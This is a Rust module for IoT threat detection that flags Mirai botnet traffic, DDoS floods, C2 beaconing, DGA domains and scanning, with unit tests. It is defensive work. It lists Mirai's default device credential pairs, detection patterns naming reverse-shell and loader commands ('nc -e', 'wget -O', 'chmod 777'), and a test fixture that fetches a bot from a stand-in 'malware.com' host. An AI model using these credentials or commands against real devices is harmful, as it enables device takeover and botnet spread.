use anyhow::Result;
use serde::{Deserialize, Serialize};
use std::collections::{HashMap, HashSet};

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct IoTThreat {
    pub threat_type: String,
    pub severity: String,
    pub description: String,
    pub affected_devices: Vec<String>,
}

/// Known Mirai botnet signatures and patterns
const MIRAI_SIGNATURES: &[&[u8]] = &[
    b"\x00\x00\x00\x01\x00\x00\x00",  // Mirai scanner signature
    b"REPORT",                         // Mirai report command
    b"/bin/busybox",                   // Common target
    b"shell\x00sh",                    // Telnet login
    b"enable\x00system",               // Router commands
];

/// Known Mirai default credential patterns
const MIRAI_CREDENTIALS: &[(&str, &str)] = &[
    ("admin", "admin"),
    ("root", "root"),
    ("admin", "password"),
    ("root", "vizxv"),
    ("root", "xc3511"),
    ("admin", "admin1234"),
    ("root", "888888"),
    ("root", "xmhdipc"),
    ("root", "default"),
    ("root", "juantech"),
    ("root", "123456"),
    ("root", "54321"),
    ("support", "support"),
    ("root", "tlJwpbo6"),
    ("root", "hi3518"),
    ("root", "jvbzd"),
    ("root", "anko"),
    ("root", "zlxx"),
    ("root", "7ujMko0vizxv"),
    ("root", "ikwb"),
    ("root", "dreambox"),
    ("root", "user"),
    ("root", "realtek"),
    ("root", "00000000"),
    ("admin", "1111111"),
    ("admin", "1234"),
    ("admin", "12345"),
    ("admin", "54321"),
    ("admin", "123456"),
    ("admin", "7ujMko0admin"),
    ("admin", "pass"),
    ("admin", "meinsm"),
    ("tech", "tech"),
    ("mother", "fucker"),
];

/// Known malicious IoT C2 domains/IPs
const KNOWN_C2_INDICATORS: &[&str] = &[
    "cnc.",
    "botnet.",
    "ddos.",
    "scan.",
    "load.",
    "report.",
];

/// Detect Mirai botnet signatures in traffic
pub async fn detect_mirai_botnet(device_id: &str, traffic: &[u8]) -> Result<Option<IoTThreat>> {
    let mut detected_signatures = Vec::new();

    // Check for known Mirai signatures in traffic
    for (idx, signature) in MIRAI_SIGNATURES.iter().enumerate() {
        if contains_pattern(traffic, signature) {
            detected_signatures.push(format!("signature_{}", idx));
        }
    }

    // Check for Mirai scanner behavior patterns
    let scanner_detected = detect_scanner_pattern(traffic);

    // Check for Mirai loader communication
    let loader_detected = detect_loader_pattern(traffic);

    // Check for credential brute force attempts
    let brute_force_detected = detect_credential_bruteforce(traffic);

    if !detected_signatures.is_empty() || scanner_detected || loader_detected || brute_force_detected {
        let mut description = String::from("Mirai botnet activity detected: ");

        if !detected_signatures.is_empty() {
            description.push_str(&format!("matched {} signatures; ", detected_signatures.len()));
        }
        if scanner_detected {
            description.push_str("scanner behavior; ");
        }
        if loader_detected {
            description.push_str("loader communication; ");
        }
        if brute_force_detected {
            description.push_str("credential bruteforce attempt; ");
        }

        return Ok(Some(IoTThreat {
            threat_type: "Mirai Botnet".to_string(),
            severity: "Critical".to_string(),
            description,
            affected_devices: vec![device_id.to_string()],
        }));
    }

    Ok(None)
}

/// Detect scanner pattern in traffic (port 23, 2323 targeting)
fn detect_scanner_pattern(traffic: &[u8]) -> bool {
    // Look for SYN packets to telnet ports
    let telnet_ports: &[u16] = &[23, 2323, 22, 5555, 7547, 9000];

    // Simple heuristic: look for multiple connection attempts
    let text = String::from_utf8_lossy(traffic);

    // Check for common scanner strings
    let scanner_strings = [
        "busybox",
        "wget http",
        "tftp",
        "chmod 777",
        "/tmp/",
        "nc -e",
        "/bin/sh",
    ];

    scanner_strings.iter().any(|s| text.contains(s))
}

/// Detect loader pattern (download and execute)
fn detect_loader_pattern(traffic: &[u8]) -> bool {
    let text = String::from_utf8_lossy(traffic);

    // Loader patterns
    let loader_patterns = [
        "wget -O",
        "curl -O",
        "tftp -g",
        "chmod +x",
        "./",
        "cd /tmp",
        "rm -rf",
    ];

    let matched = loader_patterns.iter().filter(|p| text.contains(*p)).count();
    matched >= 2  // At least 2 patterns suggest loader activity
}

/// Detect credential bruteforce attempts
fn detect_credential_bruteforce(traffic: &[u8]) -> bool {
    let text = String::from_utf8_lossy(traffic);

    let mut found_credentials = 0;
    for (user, pass) in MIRAI_CREDENTIALS.iter() {
        if text.contains(user) && text.contains(pass) {
            found_credentials += 1;
        }
    }

    found_credentials >= 3  // Multiple credential pairs suggest bruteforce
}

/// Check if traffic contains a byte pattern
fn contains_pattern(data: &[u8], pattern: &[u8]) -> bool {
    if pattern.is_empty() || data.len() < pattern.len() {
        return false;
    }

    data.windows(pattern.len()).any(|window| window == pattern)
}

/// Detect IoT-based DDoS activity
pub async fn detect_iot_ddos(traffic_patterns: &serde_json::Value) -> Result<Option<IoTThreat>> {
    // Extract traffic metrics
    let packets_per_second = traffic_patterns.get("packets_per_second")
        .and_then(|v| v.as_f64())
        .unwrap_or(0.0);

    let bytes_per_second = traffic_patterns.get("bytes_per_second")
        .and_then(|v| v.as_f64())
        .unwrap_or(0.0);

    let unique_destinations = traffic_patterns.get("unique_destinations")
        .and_then(|v| v.as_u64())
        .unwrap_or(0);

    let syn_flood_ratio = traffic_patterns.get("syn_flood_ratio")
        .and_then(|v| v.as_f64())
        .unwrap_or(0.0);

    let udp_flood_ratio = traffic_patterns.get("udp_flood_ratio")
        .and_then(|v| v.as_f64())
        .unwrap_or(0.0);

    let icmp_flood_ratio = traffic_patterns.get("icmp_flood_ratio")
        .and_then(|v| v.as_f64())
        .unwrap_or(0.0);

    let amplification_ratio = traffic_patterns.get("amplification_ratio")
        .and_then(|v| v.as_f64())
        .unwrap_or(1.0);

    let dns_query_rate = traffic_patterns.get("dns_query_rate")
        .and_then(|v| v.as_f64())
        .unwrap_or(0.0);

    let affected_devices: Vec<String> = traffic_patterns.get("source_devices")
        .and_then(|v| v.as_array())
        .map(|arr| arr.iter()
            .filter_map(|v| v.as_str().map(String::from))
            .collect())
        .unwrap_or_default();

    // Detect various DDoS attack types
    let mut attacks_detected = Vec::new();

    // SYN Flood detection
    if syn_flood_ratio > 0.8 && packets_per_second > 10000.0 {
        attacks_detected.push("SYN Flood");
    }

    // UDP Flood detection
    if udp_flood_ratio > 0.7 && bytes_per_second > 100_000_000.0 {
        attacks_detected.push("UDP Flood");
    }

    // ICMP Flood detection
    if icmp_flood_ratio > 0.6 && packets_per_second > 5000.0 {
        attacks_detected.push("ICMP Flood");
    }

    // DNS Amplification detection
    if dns_query_rate > 1000.0 && amplification_ratio > 10.0 {
        attacks_detected.push("DNS Amplification");
    }

    // HTTP Flood detection (many requests to few destinations)
    if packets_per_second > 1000.0 && unique_destinations < 10 {
        let http_requests = traffic_patterns.get("http_requests_per_second")
            .and_then(|v| v.as_f64())
            .unwrap_or(0.0);

        if http_requests > 500.0 {
            attacks_detected.push("HTTP Flood");
        }
    }

    // Volumetric attack detection
    if bytes_per_second > 1_000_000_000.0 {  // > 1 Gbps
        attacks_detected.push("Volumetric Attack");
    }

    // Slowloris detection
    let avg_connection_duration = traffic_patterns.get("avg_connection_duration")
        .and_then(|v| v.as_f64())
        .unwrap_or(0.0);
    let open_connections = traffic_patterns.get("open_connections")
        .and_then(|v| v.as_u64())
        .unwrap_or(0);

    if avg_connection_duration > 60.0 && open_connections > 1000 {
        attacks_detected.push("Slowloris");
    }

    if !attacks_detected.is_empty() {
        let severity = if bytes_per_second > 10_000_000_000.0 || attacks_detected.len() > 2 {
            "Critical"
        } else if bytes_per_second > 1_000_000_000.0 {
            "High"
        } else {
            "Medium"
        };

        return Ok(Some(IoTThreat {
            threat_type: "IoT DDoS Attack".to_string(),
            severity: severity.to_string(),
            description: format!(
                "DDoS attack detected: {}. Traffic: {:.2} Mbps, {} pps, {} unique destinations",
                attacks_detected.join(", "),
                bytes_per_second / 1_000_000.0,
                packets_per_second,
                unique_destinations
            ),
            affected_devices,
        }));
    }

    Ok(None)
}

/// Detect C2 communication patterns
pub async fn detect_c2_communication(device_id: &str, connections: &[String]) -> Result<Option<IoTThreat>> {
    let mut suspicious_connections = Vec::new();
    let mut c2_indicators = Vec::new();

    for connection in connections {
        let conn_lower = connection.to_lowercase();

        // Check against known C2 indicators
        for indicator in KNOWN_C2_INDICATORS.iter() {
            if conn_lower.contains(indicator) {
                c2_indicators.push(connection.clone());
                break;
            }
        }

        // Check for suspicious patterns
        if is_suspicious_connection(&conn_lower) {
            suspicious_connections.push(connection.clone());
        }
    }

    // Analyze connection patterns
    let pattern_analysis = analyze_connection_patterns(connections);

    // Beaconing detection
    let beaconing_detected = pattern_analysis.beaconing_score > 0.8;

    // Unusual port usage
    let unusual_ports = pattern_analysis.unusual_ports;

    // High entropy domains (DGA detection)
    let dga_detected = pattern_analysis.dga_score > 0.7;

    // Fast flux detection
    let fast_flux = pattern_analysis.fast_flux_detected;

    if !c2_indicators.is_empty() || beaconing_detected || dga_detected || !unusual_ports.is_empty() || fast_flux {
        let mut description = String::from("C2 communication indicators detected: ");

        if !c2_indicators.is_empty() {
            description.push_str(&format!("{} known C2 connections; ", c2_indicators.len()));
        }
        if beaconing_detected {
            description.push_str(&format!(
                "beaconing behavior (interval: {}s); ",
                pattern_analysis.beacon_interval.unwrap_or(0)
            ));
        }
        if dga_detected {
            description.push_str("possible DGA domains; ");
        }
        if !unusual_ports.is_empty() {
            description.push_str(&format!("unusual ports: {:?}; ", unusual_ports));
        }
        if fast_flux {
            description.push_str("fast-flux DNS detected; ");
        }

        let severity = if !c2_indicators.is_empty() || (beaconing_detected && dga_detected) {
            "Critical"
        } else if beaconing_detected || dga_detected {
            "High"
        } else {
            "Medium"
        };

        return Ok(Some(IoTThreat {
            threat_type: "C2 Communication".to_string(),
            severity: severity.to_string(),
            description,
            affected_devices: vec![device_id.to_string()],
        }));
    }

    Ok(None)
}

/// Check if a connection appears suspicious
fn is_suspicious_connection(connection: &str) -> bool {
    // Suspicious TLDs
    let suspicious_tlds = [".tk", ".ml", ".ga", ".cf", ".gq", ".xyz", ".top", ".loan", ".work"];

    // Suspicious patterns
    let suspicious_patterns = [
        "dyndns",
        "no-ip",
        "afraid.org",
        "changeip",
        "sytes.net",
        "servegame",
    ];

    suspicious_tlds.iter().any(|tld| connection.ends_with(tld)) ||
    suspicious_patterns.iter().any(|pattern| connection.contains(pattern))
}

/// Connection pattern analysis result
struct ConnectionPatternAnalysis {
    beaconing_score: f64,
    beacon_interval: Option<u64>,
    dga_score: f64,
    unusual_ports: Vec<u16>,
    fast_flux_detected: bool,
}

/// Analyze connection patterns for C2 indicators
fn analyze_connection_patterns(connections: &[String]) -> ConnectionPatternAnalysis {
    let mut timestamps: Vec<u64> = Vec::new();
    let mut domains: Vec<String> = Vec::new();
    let mut ports: HashMap<u16, usize> = HashMap::new();
    let mut ip_counts: HashMap<String, usize> = HashMap::new();

    for connection in connections {
        // Parse connection string (format: "timestamp:host:port" or "host:port")
        let parts: Vec<&str> = connection.split(':').collect();

        if parts.len() >= 2 {
            if let Ok(ts) = parts[0].parse::<u64>() {
                timestamps.push(ts);
                if parts.len() > 2 {
                    domains.push(parts[1].to_string());
                    if let Ok(port) = parts[2].parse::<u16>() {
                        *ports.entry(port).or_insert(0) += 1;
                    }
                }
            } else {
                domains.push(parts[0].to_string());
                if let Ok(port) = parts[1].parse::<u16>() {
                    *ports.entry(port).or_insert(0) += 1;
                }
            }

            // Track IP addresses for fast flux detection
            let host = if parts.len() > 2 { parts[1] } else { parts[0] };
            *ip_counts.entry(host.to_string()).or_insert(0) += 1;
        }
    }

    // Calculate beaconing score
    let (beaconing_score, beacon_interval) = calculate_beaconing_score(&timestamps);

    // Calculate DGA score based on domain entropy
    let dga_score = calculate_dga_score(&domains);

    // Find unusual ports
    let common_ports: HashSet<u16> = [80, 443, 53, 8080, 8443].iter().cloned().collect();
    let unusual_ports: Vec<u16> = ports.keys()
        .filter(|p| !common_ports.contains(p))
        .filter(|p| ports.get(p).map(|c| *c > 5).unwrap_or(false))
        .cloned()
        .collect();

    // Fast flux detection (many IPs for same domain)
    let fast_flux_detected = ip_counts.values().any(|count| *count > 10);

    ConnectionPatternAnalysis {
        beaconing_score,
        beacon_interval,
        dga_score,
        unusual_ports,
        fast_flux_detected,
    }
}

/// Calculate beaconing score from timestamps
fn calculate_beaconing_score(timestamps: &[u64]) -> (f64, Option<u64>) {
    if timestamps.len() < 3 {
        return (0.0, None);
    }

    let mut sorted = timestamps.to_vec();
    sorted.sort();

    // Calculate intervals between consecutive timestamps
    let intervals: Vec<i64> = sorted.windows(2)
        .map(|w| (w[1] as i64 - w[0] as i64).abs())
        .collect();

    if intervals.is_empty() {
        return (0.0, None);
    }

    // Calculate mean and standard deviation
    let mean: f64 = intervals.iter().map(|i| *i as f64).sum::<f64>() / intervals.len() as f64;
    let variance: f64 = intervals.iter()
        .map(|i| (*i as f64 - mean).powi(2))
        .sum::<f64>() / intervals.len() as f64;
    let std_dev = variance.sqrt();

    // Coefficient of variation - lower means more regular (beaconing)
    let cv = if mean > 0.0 { std_dev / mean } else { 1.0 };

    // Convert to score (0.0 = random, 1.0 = perfect beaconing)
    let beaconing_score = (1.0 - cv.min(1.0)).max(0.0);

    let beacon_interval = if beaconing_score > 0.5 {
        Some(mean as u64)
    } else {
        None
    };

    (beaconing_score, beacon_interval)
}

/// Calculate DGA (Domain Generation Algorithm) score based on domain entropy
fn calculate_dga_score(domains: &[String]) -> f64 {
    if domains.is_empty() {
        return 0.0;
    }

    let mut dga_like_domains = 0;

    for domain in domains {
        // Extract domain name without TLD
        let parts: Vec<&str> = domain.split('.').collect();
        if parts.is_empty() {
            continue;
        }

        let name = parts[0];

        // Calculate entropy
        let entropy = calculate_entropy(name);

        // Check for DGA characteristics
        let has_high_entropy = entropy > 3.5;
        let has_unusual_length = name.len() > 12 || (name.len() > 8 && has_high_entropy);
        let has_many_consonants = count_consonant_ratio(name) > 0.7;
        let has_numbers = name.chars().any(|c| c.is_ascii_digit());

        if (has_high_entropy && has_unusual_length) ||
           (has_many_consonants && has_numbers) ||
           (entropy > 4.0) {
            dga_like_domains += 1;
        }
    }

    dga_like_domains as f64 / domains.len() as f64
}

/// Calculate Shannon entropy of a string
fn calculate_entropy(s: &str) -> f64 {
    if s.is_empty() {
        return 0.0;
    }

    let mut char_counts: HashMap<char, usize> = HashMap::new();
    for c in s.chars() {
        *char_counts.entry(c).or_insert(0) += 1;
    }

    let len = s.len() as f64;
    char_counts.values()
        .map(|count| {
            let p = *count as f64 / len;
            if p > 0.0 { -p * p.log2() } else { 0.0 }
        })
        .sum()
}

/// Calculate consonant ratio in a string
fn count_consonant_ratio(s: &str) -> f64 {
    if s.is_empty() {
        return 0.0;
    }

    let vowels: HashSet<char> = ['a', 'e', 'i', 'o', 'u'].iter().cloned().collect();
    let letters: Vec<char> = s.chars().filter(|c| c.is_ascii_alphabetic()).collect();

    if letters.is_empty() {
        return 0.0;
    }

    let consonants = letters.iter()
        .filter(|c| !vowels.contains(&c.to_ascii_lowercase()))
        .count();

    consonants as f64 / letters.len() as f64
}

/// Detect scanning/propagation behavior
pub async fn detect_scanning_behavior(device_id: &str, traffic: &[u8]) -> Result<Option<IoTThreat>> {
    let text = String::from_utf8_lossy(traffic);

    // Analyze traffic for scanning patterns
    let mut indicators = Vec::new();

    // Port scanning signatures
    let port_scan_patterns = [
        "SYN scan",
        "connect scan",
        "FIN scan",
        "XMAS scan",
        "NULL scan",
    ];

    // Service enumeration patterns
    let enumeration_patterns = [
        "GET / HTTP",
        "OPTIONS /",
        "HEAD /",
        "SSH-",
        "220 ",  // FTP banner
        "EHLO",  // SMTP
    ];

    // Check for sequential IP targeting
    let sequential_ips = detect_sequential_ip_targeting(&text);

    // Check for common port targeting
    let common_port_targeting = detect_common_port_targeting(&text);

    // Check for propagation commands
    let propagation_patterns = [
        "wget",
        "curl",
        "tftp",
        "chmod",
        "nc -e",
        "sh -i",
        "/bin/bash",
    ];

    let propagation_detected = propagation_patterns.iter()
        .filter(|p| text.contains(*p))
        .count() >= 2;

    if sequential_ips {
        indicators.push("sequential IP targeting");
    }

    if common_port_targeting {
        indicators.push("common IoT port targeting");
    }

    if propagation_detected {
        indicators.push("propagation commands detected");
    }

    // Check for credential spraying
    let credential_spraying = detect_credential_spraying(&text);
    if credential_spraying {
        indicators.push("credential spraying detected");
    }

    if !indicators.is_empty() {
        return Ok(Some(IoTThreat {
            threat_type: "Scanning/Propagation".to_string(),
            severity: if propagation_detected { "Critical" } else { "High" }.to_string(),
            description: format!(
                "Scanning/propagation behavior detected from device: {}",
                indicators.join(", ")
            ),
            affected_devices: vec![device_id.to_string()],
        }));
    }

    Ok(None)
}

/// Detect sequential IP targeting (subnet scanning)
fn detect_sequential_ip_targeting(text: &str) -> bool {
    // Look for patterns like 192.168.1.1, 192.168.1.2, 192.168.1.3...
    let ip_pattern = regex::Regex::new(r"(\d{1,3}\.\d{1,3}\.\d{1,3}\.)(\d{1,3})").unwrap();

    let mut subnet_counts: HashMap<String, Vec<u8>> = HashMap::new();

    for cap in ip_pattern.captures_iter(text) {
        if let (Some(subnet), Some(host)) = (cap.get(1), cap.get(2)) {
            if let Ok(host_num) = host.as_str().parse::<u8>() {
                subnet_counts
                    .entry(subnet.as_str().to_string())
                    .or_default()
                    .push(host_num);
            }
        }
    }

    // Check if any subnet has sequential IPs
    for hosts in subnet_counts.values() {
        if hosts.len() >= 5 {
            let mut sorted = hosts.clone();
            sorted.sort();
            sorted.dedup();

            // Count sequential sequences
            let mut sequential_count = 0;
            for window in sorted.windows(2) {
                if window[1] == window[0] + 1 {
                    sequential_count += 1;
                }
            }

            if sequential_count >= 3 {
                return true;
            }
        }
    }

    false
}

/// Detect common IoT port targeting
fn detect_common_port_targeting(text: &str) -> bool {
    let iot_ports = ["23", "2323", "22", "80", "8080", "8443", "5555", "7547", "9000", "37777"];
    let port_pattern = regex::Regex::new(r":(\d+)").unwrap();

    let mut port_counts: HashMap<&str, usize> = HashMap::new();

    for cap in port_pattern.captures_iter(text) {
        if let Some(port) = cap.get(1) {
            let port_str = port.as_str();
            if iot_ports.contains(&port_str) {
                *port_counts.entry(port_str).or_insert(0) += 1;
            }
        }
    }

    // Multiple IoT ports targeted
    port_counts.len() >= 3 || port_counts.values().any(|c| *c > 10)
}

/// Detect credential spraying attempts
fn detect_credential_spraying(text: &str) -> bool {
    let mut credential_attempts = 0;

    for (user, pass) in MIRAI_CREDENTIALS.iter() {
        if text.contains(user) || text.contains(pass) {
            credential_attempts += 1;
        }
    }

    credential_attempts >= 5
}

/// Detect anomalous communication patterns
pub async fn detect_anomalous_communication(device_id: &str, profile: &serde_json::Value) -> Result<Vec<IoTThreat>> {
    let mut threats = Vec::new();

    // Extract baseline profile
    let baseline = profile.get("baseline").unwrap_or(&serde_json::Value::Null);
    let current = profile.get("current").unwrap_or(&serde_json::Value::Null);

    // Compare traffic volume
    let baseline_volume = baseline.get("bytes_per_day")
        .and_then(|v| v.as_f64())
        .unwrap_or(0.0);
    let current_volume = current.get("bytes_per_day")
        .and_then(|v| v.as_f64())
        .unwrap_or(0.0);

    if baseline_volume > 0.0 {
        let volume_ratio = current_volume / baseline_volume;
        if volume_ratio > 10.0 {
            threats.push(IoTThreat {
                threat_type: "Traffic Volume Anomaly".to_string(),
                severity: "High".to_string(),
                description: format!(
                    "Traffic volume {:.1}x higher than baseline ({:.2} MB vs {:.2} MB daily)",
                    volume_ratio,
                    current_volume / 1_000_000.0,
                    baseline_volume / 1_000_000.0
                ),
                affected_devices: vec![device_id.to_string()],
            });
        }
    }

    // Compare connection patterns
    let baseline_connections: HashSet<String> = baseline.get("destinations")
        .and_then(|v| v.as_array())
        .map(|arr| arr.iter()
            .filter_map(|v| v.as_str().map(String::from))
            .collect())
        .unwrap_or_default();

    let current_connections: HashSet<String> = current.get("destinations")
        .and_then(|v| v.as_array())
        .map(|arr| arr.iter()
            .filter_map(|v| v.as_str().map(String::from))
            .collect())
        .unwrap_or_default();

    // New destinations not in baseline
    let new_destinations: Vec<_> = current_connections.difference(&baseline_connections).collect();

    if new_destinations.len() > 5 {
        threats.push(IoTThreat {
            threat_type: "New Destination Anomaly".to_string(),
            severity: "Medium".to_string(),
            description: format!(
                "{} new destinations not in baseline profile: {:?}",
                new_destinations.len(),
                new_destinations.iter().take(5).collect::<Vec<_>>()
            ),
            affected_devices: vec![device_id.to_string()],
        });
    }

    // Compare protocol usage
    let baseline_protocols: HashMap<String, f64> = baseline.get("protocols")
        .and_then(|v| serde_json::from_value(v.clone()).ok())
        .unwrap_or_default();

    let current_protocols: HashMap<String, f64> = current.get("protocols")
        .and_then(|v| serde_json::from_value(v.clone()).ok())
        .unwrap_or_default();

    // Check for unusual protocol usage
    for (protocol, current_pct) in &current_protocols {
        let baseline_pct = baseline_protocols.get(protocol).copied().unwrap_or(0.0);

        // New protocol or significant increase
        if baseline_pct == 0.0 && *current_pct > 5.0 {
            threats.push(IoTThreat {
                threat_type: "New Protocol Usage".to_string(),
                severity: "Medium".to_string(),
                description: format!(
                    "Device started using {} protocol ({:.1}% of traffic), not seen in baseline",
                    protocol, current_pct
                ),
                affected_devices: vec![device_id.to_string()],
            });
        } else if baseline_pct > 0.0 && *current_pct / baseline_pct > 5.0 {
            threats.push(IoTThreat {
                threat_type: "Protocol Usage Anomaly".to_string(),
                severity: "Low".to_string(),
                description: format!(
                    "{} protocol usage increased from {:.1}% to {:.1}%",
                    protocol, baseline_pct, current_pct
                ),
                affected_devices: vec![device_id.to_string()],
            });
        }
    }

    // Check for unusual timing patterns
    let baseline_active_hours: Vec<u8> = baseline.get("active_hours")
        .and_then(|v| serde_json::from_value(v.clone()).ok())
        .unwrap_or_default();

    let current_active_hours: Vec<u8> = current.get("active_hours")
        .and_then(|v| serde_json::from_value(v.clone()).ok())
        .unwrap_or_default();

    if !baseline_active_hours.is_empty() {
        let baseline_set: HashSet<u8> = baseline_active_hours.iter().cloned().collect();
        let new_active_hours: Vec<u8> = current_active_hours.iter()
            .filter(|h| !baseline_set.contains(h))
            .cloned()
            .collect();

        if new_active_hours.len() > 4 {
            threats.push(IoTThreat {
                threat_type: "Activity Time Anomaly".to_string(),
                severity: "Low".to_string(),
                description: format!(
                    "Device active during unusual hours: {:?}",
                    new_active_hours
                ),
                affected_devices: vec![device_id.to_string()],
            });
        }
    }

    // Check DNS query patterns
    let baseline_dns_rate = baseline.get("dns_queries_per_hour")
        .and_then(|v| v.as_f64())
        .unwrap_or(0.0);
    let current_dns_rate = current.get("dns_queries_per_hour")
        .and_then(|v| v.as_f64())
        .unwrap_or(0.0);

    if baseline_dns_rate > 0.0 && current_dns_rate / baseline_dns_rate > 10.0 {
        threats.push(IoTThreat {
            threat_type: "DNS Query Anomaly".to_string(),
            severity: "Medium".to_string(),
            description: format!(
                "DNS query rate {:.1}x higher than baseline ({:.0} vs {:.0} queries/hour)",
                current_dns_rate / baseline_dns_rate,
                current_dns_rate,
                baseline_dns_rate
            ),
            affected_devices: vec![device_id.to_string()],
        });
    }

    Ok(threats)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_contains_pattern() {
        assert!(contains_pattern(b"hello world", b"world"));
        assert!(!contains_pattern(b"hello world", b"foo"));
        assert!(!contains_pattern(b"hi", b"hello"));
    }

    #[test]
    fn test_calculate_entropy() {
        // Low entropy (repeated chars)
        assert!(calculate_entropy("aaaa") < 1.0);
        // Higher entropy (varied chars)
        assert!(calculate_entropy("abcd") > 1.5);
        // DGA-like high entropy
        assert!(calculate_entropy("xkjh3nf92m") > 3.0);
    }

    #[test]
    fn test_consonant_ratio() {
        assert!(count_consonant_ratio("bcd") > 0.9);
        assert!(count_consonant_ratio("aeiou") < 0.1);
        assert!(count_consonant_ratio("hello") > 0.5);
    }

    #[tokio::test]
    async fn test_detect_mirai_patterns() {
        let traffic = b"USER admin\nPASS admin\n/bin/busybox wget http://malware.com/bot";
        let result = detect_mirai_botnet("device1", traffic).await.unwrap();
        assert!(result.is_some());
    }

    #[tokio::test]
    async fn test_detect_ddos() {
        let patterns = serde_json::json!({
            "packets_per_second": 50000.0,
            "bytes_per_second": 500_000_000.0,
            "unique_destinations": 3,
            "syn_flood_ratio": 0.9,
            "source_devices": ["device1", "device2"]
        });

        let result = detect_iot_ddos(&patterns).await.unwrap();
        assert!(result.is_some());
        assert_eq!(result.unwrap().severity, "Medium");
    }

    #[test]
    fn test_beaconing_detection() {
        // Regular intervals (beaconing)
        let timestamps = vec![100, 200, 300, 400, 500];
        let (score, interval) = calculate_beaconing_score(&timestamps);
        assert!(score > 0.8);
        assert_eq!(interval, Some(100));

        // Random intervals
        let random_timestamps = vec![100, 150, 400, 420, 900];
        let (score2, _) = calculate_beaconing_score(&random_timestamps);
        assert!(score2 < 0.5);
    }
}
